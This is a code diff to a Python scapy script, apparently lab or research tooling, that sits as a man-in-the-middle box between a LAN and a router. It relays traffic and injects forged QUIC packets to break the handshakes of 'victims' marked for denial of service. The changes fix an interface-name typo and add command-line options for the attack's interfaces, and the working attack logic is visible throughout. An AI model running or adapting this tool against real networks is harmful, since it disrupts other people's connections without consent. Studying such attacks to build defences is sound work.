@@ -1,4 +1,5 @@
 import os
+import argparse
 
 from scapy.all import *
 load_contrib("quic")
@@ -12,12 +13,9 @@ from forge import forge_cc_scapy
 import threading, sys, os
 from victims import Victims
 
-# global variables, change them only here 
-##TODO: add changing of those while running 
-inner_ifcae = 'middlebox-eth0' 
-outer_ifcae = 'middlebox-eth1'
 
-vs = Victims()
+
+
 
 def add_and_send_to_server(pkt):
     new_pkt = pkt[IP]
@@ -25,7 +23,7 @@ def add_and_send_to_server(pkt):
     del new_pkt.getlayer(IP).chksum
     del new_pkt.getlayer(UDP).chksum
     #print(f"New PKT to server: {new_pkt.summary()}")
-    send(new_pkt, iface=outer_ifcae, verbose=False)
+    send(new_pkt, iface=outer_iface, verbose=False)
 
 
 def send_attack(victim):
@@ -45,13 +43,13 @@ def send_attack(victim):
         dcid_header = dcid_in_header,
         tpl = tpl,
         frame = frame)
-    send(forged, iface=inner_ifcae, verbose=False)
+    send(forged, iface=inner_iface, verbose=False)
 
 def handle_quic(pkt):
     global vs
     # Only process if this packet has a QUIC Initial header
-    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_ifcae) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_ifcae):
-        if pkt.sniffed_on == inner_ifcae:
+    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_iface) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_iface):
+        if pkt.sniffed_on == inner_iface:
             vs.update(pkt)
             if QUIC_Initial in pkt and (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                 send_attack(pkt)
@@ -62,7 +60,7 @@ def handle_quic(pkt):
             
 
                     
-        elif pkt.sniffed_on == outer_ifcae:
+        elif pkt.sniffed_on == outer_iface:
             new_dst = vs.find_victim_from_wan_by_port(pkt[UDP].dport)
             if new_dst != "":
                 #print(f"From server: {pkt.summary()}")
@@ -71,19 +69,40 @@ def handle_quic(pkt):
                 del new_pkt.getlayer(IP).chksum
                 del new_pkt.getlayer(UDP).chksum
                 #print(f"New PKT to client: {new_pkt.summary()}")
-                send(new_pkt, iface=inner_ifcae, verbose=False)
+                send(new_pkt, iface=inner_iface, verbose=False)
             else:
                 print("A packet of unknown LAN destination.")
                 # Need to fix change of victim sport with new connections of same src and dest ips.
 
 
-if __name__ == "__main__":       
+if __name__ == "__main__":
+    """
+        Global variables, constants and configurations settings.
+    """
+    parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
+    parser.add_argument(
+        "--inner-iface",
+        type=str,
+        default='middlebox-eth0',
+        help="The name of the interface/network adapter that connects the middlebox to the LAN network.",
+    )
+    parser.add_argument(
+        "--outer-iface",
+        type=str,
+        default='middlebox-eth1',
+        help="The name of the interface/network adapter that connects the middlebox to the Router/WAN network.",
+    )
+    args = parser.parse_args()
+    
+    ##TODO: add changing of those while running 
+    inner_iface = args.inner_iface
+    outer_iface = args.outer_iface
+    vs = Victims()
+    #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
     threading.Thread(target=vs.run, daemon=True).start()
     # Sniff UDP 443 traffic and invoke handle_quic for each packet
     sniff(
-        #iface="Ethernet 2",
-        iface=[inner_ifcae, outer_ifcae],
-        #filter="udp port 443",
+        iface=[inner_iface, outer_iface],
         prn=handle_quic,         # callback for every packet
         store=False                  # don’t keep packets in memory
     )
